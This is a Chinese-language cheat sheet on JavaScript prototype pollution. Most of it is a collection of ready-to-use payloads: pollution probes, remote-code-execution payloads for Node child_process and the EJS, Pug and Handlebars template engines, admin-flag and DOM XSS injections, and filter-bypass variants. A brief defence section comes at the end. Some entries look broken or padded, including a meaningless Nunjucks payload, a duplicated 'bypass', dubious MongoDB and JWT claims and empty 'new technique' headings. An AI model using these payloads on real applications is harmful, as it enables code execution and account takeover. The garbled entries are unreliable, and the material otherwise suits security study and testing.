# 原型链污染 (Prototype Pollution)

## 原理

JavaScript 中所有对象都继承自 `Object.prototype`，攻击者通过 `__proto__` 或 `constructor.prototype` 修改原型对象，影响所有继承该原型的对象，从而触发各种 gadget 实现 RCE、XSS、权限绕过等。

## 攻击链

### 1. 探测污染点

```javascript
// 常见危险函数
merge(obj1, obj2)
extend(obj1, obj2)
defaultsDeep(obj1, obj2)
cloneDeep(obj)
assign(obj1, obj2)  // Object.assign 安全，但自定义的 assign 可能不安全

// 测试 payload
{"__proto__": {"polluted": "yes"}}
// 然后检查
console.log({}.polluted)  // "yes" 说明存在污染
```

### 2. 经典 merge 函数漏洞

```javascript
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// 攻击
merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'))
console.log({}.polluted)  // "yes"
```

### 3. 污染方式

```javascript
// 方式 1: __proto__
obj.__proto__.polluted = 'yes'
JSON.parse('{"__proto__": {"polluted": "yes"}}')

// 方式 2: constructor.prototype
obj.constructor.prototype.polluted = 'yes'
JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}')
```

## 利用场景

### 1. Node.js RCE

```javascript
// child_process.spawn / spawnSync
// 通过原型链污染 options.shell
// 触发执行

// payload
{"__proto__": {"shell": "/bin/sh"}}
{"__proto__": {"shell": "node"}}
{"__proto__": {"shell": "/bin/sh", "env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}

// 触发
require('child_process').spawnSync('id')
```

### 2. Express + EJS RCE

```javascript
// EJS 模板渲染时使用 settings
// 通过污染 settings['view options']

// payload
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// 触发
res.render('index')
```

### 3. Express + Pug RCE

```javascript
// payload
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}

// 触发
res.render('index')
```

### 4. Express + Handlebars RCE

```javascript
// payload
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": 0, "params": [{"type": "NumberLiteral", "value": "process.mainModule.require('child_process').execSync('id')"}], "loc": 0}]}}
```

### 5. Express + Nunjucks RCE

```javascript
// payload
{"__proto__": {"__proto__": {"tmpl": "test"}}}
```

### 6. MongoDB 注入

```javascript
// 通过原型链污染查询条件
// payload
{"__proto__": {"isAdmin": true}}

// 触发
User.find({})  // 所有用户都被认为是 admin
```

### 7. JWT 算法混淆

```javascript
// 通过原型链污染 jwt secret
// payload
{"__proto__": {"algorithm": "none"}}
```

### 8. Express session 操纵

```javascript
// payload
{"__proto__": {"isAdmin": true}}

// 触发
req.session.user = {username: 'guest'}
console.log(req.session.user.isAdmin)  // true
```

### 9. DOM XSS

```javascript
// payload
{"__proto__": {"src": "data:,alert(1)"}}
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}

// 触发
// 当应用使用 $.extend 或类似函数处理用户输入
```

### 10. jQuery 污染

```javascript
// jQuery < 3.5.0
$.extend(true, {}, JSON.parse('{"__proto__": {"polluted": "yes"}}'))
console.log({}.polluted)  // "yes"
```

## 服务端原型链污染 (Server-Side Prototype Pollution)

### 1. Express 应用

```javascript
// 通过 body-parser
// POST /api/update
// Content-Type: application/json
// {"__proto__": {"status": 500}}

// 影响 Express 响应
// 通过污染 status, headers 等
```

### 2. Next.js

```javascript
// Next.js SSR
// 通过原型链污染影响渲染
```

### 3. NestJS

```javascript
// NestJS DTO
// 通过原型链污染绕过验证
```

## 绕过技巧

### 1. __proto__ 过滤

```javascript
// 用 constructor.prototype
{"constructor": {"prototype": {"polluted": "yes"}}}

// 用 __proto__ 的变体
{"__proto__": {"polluted": "yes"}}
{"__proto__": {"__proto__": {"polluted": "yes"}}}
```

### 2. JSON.parse 绕过

```javascript
// JSON.parse 默认会解析 __proto__
// 但有些库会过滤
// 用 constructor.prototype 绕过
```

### 3. URL 参数污染

```
# Express query string
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes

# 通过 qs 库解析
# qs 默认支持嵌套对象
```

## 2024-2026 新技术点

### 1. 新 gadget 链

```javascript
// 不断有新的 gadget 被发现
// 关注 GitHub: Prototype Pollution Gadgets
// https://github.com/yusukebe/prototype-pollution-gadgets

// 2024 新 gadget
// - GraphQL Yoga
// - Fastify
// - Hapi
// - Koa
```

### 2. React Server Components

```javascript
// RSC 中的原型链污染
// 通过污染 RSC payload 影响 SSR
```

### 3. Bun 运行时

```javascript
// Bun 运行时的新 gadget
// Bun.serve 中的原型链污染
```

### 4. Deno 运行时

```javascript
// Deno 中的原型链污染
// 通过 import map 操纵
```

### 5. WebAssembly + JS

```javascript
// WASM 模块与 JS 交互时的原型链污染
```

### 6. Cloudflare Workers

```javascript
// Workers 环境中的原型链污染
// 通过 fetch handler 触发
```

### 7. Electron 应用

```javascript
// Electron 主进程原型链污染
// 可导致 RCE
// 通过 IPC 通信触发
```

### 8. AI 应用原型链污染

```javascript
// LangChain.js
// 通过原型链污染影响 LLM 调用
// 通过 prompt 操纵
```

### 9. 现代框架新特性

```javascript
// Next.js 14 App Router
// Remix
// Astro
// SvelteKit
// 各框架的原型链污染 gadget
```

### 10. Node.js 新 API

```javascript
// Node.js 20+ 新 API
// 通过 test runner 操纵
// 通过 worker_threads 操纵
```

## 防护与检测

```javascript
// 1. 使用 Object.create(null)
const obj = Object.create(null)  // 无原型

// 2. 使用 Map 代替 Object
const map = new Map()

// 3. 冻结原型
Object.freeze(Object.prototype)

// 4. 使用安全库
// lodash 4.17.20+ 修复了原型链污染
// 使用 lodash-es 或 lodash.merge 时注意版本

// 5. 检测
// 使用 npm audit 检查依赖
// 使用 SAST 工具
```

## 工具推荐

- **PPScan** — 原型链污染扫描
- **ppmap** — 自动化利用
- **Node.js Prototype Pollution Gadgets** — gadget 集合
- **Burp Suite** — 手动测试

## 参考链接

- [PortSwigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [PayloadsAllTheThings - Prototype Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution)
- [Prototype Pollution to RCE](https://blog.sonarsource.com/prototype-pollution-to-rce/)
- [Node.js Prototype Pollution Gadgets](https://github.com/yusukebe/prototype-pollution-gadgets)
